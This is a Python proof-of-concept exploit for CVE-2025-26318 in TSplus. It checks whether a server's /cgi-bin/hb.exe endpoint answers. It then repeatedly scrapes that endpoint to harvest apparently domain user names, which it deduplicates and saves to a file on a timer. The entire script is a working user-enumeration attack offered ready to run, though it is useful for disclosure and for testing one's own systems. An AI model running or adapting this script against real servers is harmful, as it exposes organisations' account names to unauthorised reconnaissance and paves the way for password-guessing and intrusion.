# Découverte vulnérabilité par Frozenk
# https://github.com/Frozenka
# CVE-2025-26318

import requests
import time
from datetime import datetime

print("This script checks the vulnerability of TSplus to domain user enumeration\n")

# Saisie des paramètres utilisateur
url = input("Enter URL (https://site.vuln.fr) : ")
url = url+("/cgi-bin/hb.exe") # ajout de la partie vulnérable de TSlog

# Test si application vulnérable
try:
    response = requests.get(url)

    # Vérifier si le statut HTTP est 200
    if response.status_code == 200:
        print("! Vulnerable ! ")
    else:
        print(f"Non-vulnerable site, HTTP status: {response.status_code} ")
except requests.exceptions.RequestException as e:
    # En cas d'erreur (problème de connexion, etc.)
    print(f"Error connecting to the URL {e}")


filename = input("Output file name : ")
interval_minutes = int(input("Execution (in minutes) : "))  # Conversion en entier

# Fonction pour récupérer les données de la page web
def fetch_data_from_web(url):

    response = requests.get(url)
    if response.status_code == 200:
        return response.text

    else:

        print(f"Error to acces page : {response.status_code}")
        return None



# Fonction pour extraire les données après les chiffres

def extract_data(data):

    lines = data.splitlines()
    extracted_data = []
    for line in lines:
        parts = line.split(":")
        if len(parts) > 4:

            extracted_data.append(parts[-1].strip())  # Récupère la dernière partie et retire les espaces inutiles

    return extracted_data



# Fonction pour écrire les données uniques dans un fichier, chaque donnée sur une nouvelle ligne
def write_unique_data_to_file(data, filename):

    try:
        # Lire les données existantes dans le fichier
        with open(filename, 'r') as file:
            existing_data = file.read().splitlines()

    except FileNotFoundError:

        # Si le fichier n'existe pas encore, initialiser une liste vide
        existing_data = []

    # Filtrer les nouvelles données pour qu'elles soient uniques
    new_data = [d for d in data if d not in existing_data]

    # Si on a des nouvelles données, les ajouter
    if new_data:

        with open(filename, 'a') as file:
            for entry in new_data:
                file.write(entry + '\n')  # Écrit chaque donnée sur une nouvelle ligne
        print(f"{len(new_data)} new data add.")

    else:
        print("No new data.")

# Fonction principale pour exécuter le script périodiquement
def run_periodically(url, filename, interval_minutes):

    while True:
        data = fetch_data_from_web(url)
        if data:
            extracted_data = extract_data(data)
            write_unique_data_to_file(extracted_data, filename)

        else:
            print("Impossible to get data.")


        # Obtenir l'heure actuelle et la formater
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(f"[{current_time}] Waiting for {interval_minutes} minutes before the next execution...")

        # Mettre en pause pour l'intervalle défini
        time.sleep(interval_minutes * 60)

# Exécution du script en boucle
run_periodically(url, filename, interval_minutes)

#EOF
